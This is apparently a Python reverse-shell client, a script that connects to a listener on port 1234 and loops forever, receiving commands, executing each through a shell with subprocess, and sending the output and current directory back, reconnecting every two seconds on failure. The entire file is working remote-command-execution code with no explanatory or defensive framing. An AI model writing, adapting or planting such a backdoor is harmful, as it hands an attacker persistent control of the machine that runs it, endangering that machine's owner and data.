import socket,time
import subprocess,os

def connection(HOST,PORT):
    HEADERSIZE = 10
    cl = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    cl.connect((HOST,PORT))

    # Todo live file streaming and editing
    while True:
        cmd = cl.recv(4096)
        try:
            if cmd[:2].decode("utf-8") == 'cd':
                os.chdir(cmd[3:].decode("utf-8"))
        except OSError:
            pass

        if len(cmd.decode('utf-8')) > 0:
            cmd_obj =  subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            output = cmd_obj.stdout.read() + cmd_obj.stderr.read()
            output = str('{}\n{}~$'.format(output.decode('utf-8'),os.getcwd()))
            header = '{:<{header}}'.format(len(output),header=HEADERSIZE)
            output = header + output
            # print(output[:HEADERSIZE])
            cl.send(str.encode(output,'utf-8'))
        else:
            # print('equals to hello')
            # cl.send(str())
            continue
        # cl.close()

# def send_recv()

while True:
    try:
        connection(socket.gethostname(),1234)
    except socket.error:

        time.sleep(2)
